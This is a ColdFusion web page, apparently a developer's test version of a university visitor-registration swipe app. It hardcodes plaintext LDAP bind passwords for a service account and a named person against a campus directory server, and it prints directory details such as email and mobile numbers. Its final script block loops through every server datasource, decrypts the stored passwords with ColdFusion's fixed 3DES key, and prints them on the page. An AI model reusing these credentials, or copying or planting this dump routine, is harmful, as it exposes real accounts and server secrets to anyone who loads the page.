<!doctype html>
<!--[if lt IE 7 ]> <html class="ie ie6 no-js" lang="en"> <![endif]-->
<!--[if IE 7 ]>    <html class="ie ie7 no-js" lang="en"> <![endif]-->
<!--[if IE 8 ]>    <html class="ie ie8 no-js" lang="en"> <![endif]-->
<!--[if IE 9 ]>    <html class="ie ie9 no-js" lang="en"> <![endif]-->
<!--[if gt IE 9]><!--><html class="no-js" lang="en"><!--<![endif]-->
<!-- the "no-js" class is for Modernizr. -->
<meta charset="utf-8">
<cfcontent type="text/html; charset=utf-8">
<!-- Always force latest IE rendering engine (even in intranet) & Chrome Frame -->
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<title>C.C.A.C Swipe Application</title>
<meta name="viewport" content="width=device-width, maximum-scale=1.0, user-scalable=yes;" />
<link rel="stylesheet" href="_/css/style.css">
<script src="_/js/modernizr-1.7.min.js"></script>
<link href='http://fonts.googleapis.com/css?family=Leckerli+One|Rokkitt:700,400|Luckiest+Guy' rel='stylesheet' type='text/css'>
<!-- Stylesheets -->
<link rel="stylesheet" href="./_/css/style.css" />
<link rel="stylesheet" href="./_/css/desktop.css" />
<!-- Target iPhone -->
<link rel="stylesheet" href="./_/css/handheld.css" media="(max-device-width:480px)" />
<!-- Target iPad -->
<link rel="stylesheet" href="./_/css/tablet.css" media="(min-device-width:768px) and (max-device-width:1024px)" />
<!-- Target Galaxy Tab -->
<link rel="stylesheet" href="./_/css/tablet.css" media="(min-width:1280px) and (max-width:1280px)" />
<link rel="stylesheet" href="./_/css/tablet.css" media="(min-width:800px) and (max-width:800px)" />
<cfapplication sessionmanagement="yes" sessiontimeout="#CreateTimeSpan(0,0,30,0)#">
</head><script language="javascript">
  $(function() {

   $(document).ready(function() {
    if( /Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent) ) {
      alert("Mobile Device");
    }
    Placeholder.init({
      wait: true
    });
  });
 });
  </script>
<body class="oneColElsCtrHdr">
<div id="container">
  <div id="header">
    <h1>C.C.A.C Visitor Registration</h1>
    <!-- end #header -->
  </div>
  <div id="mainContent">
    <cfldap action="query" name="results" start="ou=sjsupeople,dc=sjsuad,dc=sjsu,dc=edu" 
        attributes="cn,samaccountname,mail,dn,info" server="130.65.3.134" port="636" password="def678AD" 
        username="cn=phpldap2,ou=users,ou=administration,dc=sjsuad,dc=sjsu,dc=edu" secure="CFSSL_BASIC" filter="samaccountname=008646222">
    <cfoutput>#results.recordCount# matches found </cfoutput> <cfoutput>#results.columnlist# is the ColumnList</cfoutput>
    <CFLOOP list="#results.columnlist#" index="column_name">
      <cfoutput>#column_name#</cfoutput>
    </CFLOOP>
    <table border="1">
      <cfoutput query = "results">
        <tr>
          <td>#samaccountname#</td>
          <td>#cn#</td>
          <td>#mail#</td>
          <td>#dn#</td>
          <td>#info#</td>
        </tr>
      </cfoutput>
    </table>
    <cftry>
      <cfldap action="query" name="results2" start="ou=sjsupeople,dc=sjsuad,dc=sjsu,dc=edu" 
          attributes="cn,samaccountname,mail,dn,mobile" server="130.65.3.134" port="636" password="amma@a123" 
          username="CN=Vaishak Suresh, OU=Employees, ou=sjsupeople, dc=sjsuad, dc=sjsu, dc=edu" secure="CFSSL_BASIC" filter="cn=Vaishak Suresh">
      <cfoutput>#results2.recordCount# records found </cfoutput>
      <cfcatch type="any">
        <cfoutput>Login Not Successful #cfcatch.detail# </cfoutput>
      </cfcatch>
    </cftry>
    <!-- end #mainContent -->
  </div>
  <div id="footer">
    <p></p>
    <!-- end #footer -->
  </div>
  <!-- end #container -->
</div>
<form name="updateprofile" action="updateprofile.cfm">
  <select class="rounded" id = "myList">
    <option value = "1">one</option>
    <option value = "2">two</option>
    <option value = "3">three</option>
    <option value = "4">four</option>
  </select>
</form>
<cfscript>
// Create Data Source Object
    dataSourceObb=createobject("java","coldfusion.server.ServiceFactory").
	getDatasourceService().getDatasources();
    
    // Loop Through DataSources
    for(i in dataSourceObb) {
     if(len(dataSourceObb[i]["password"])){
	 
     // Get username
     username=(dataSourceObb[i]["username"]);
	 
     // Get and decrypt password
     decryptPassword=Decrypt(dataSourceObb[i]["password"],
     generate3DesKey("0yJ!@1$r8p0L@r1$6yJ!@1rj"), "DESede",
     "Base64");
	 
     // Output all datasources along with username and passwords
     writeoutput("" & "DataSource: "  & i & "
" & 
     "Username: " & username & "
Password: " & 
     decryptPassword &"

");
     }
    }
	</cfscript>
</body>
</html>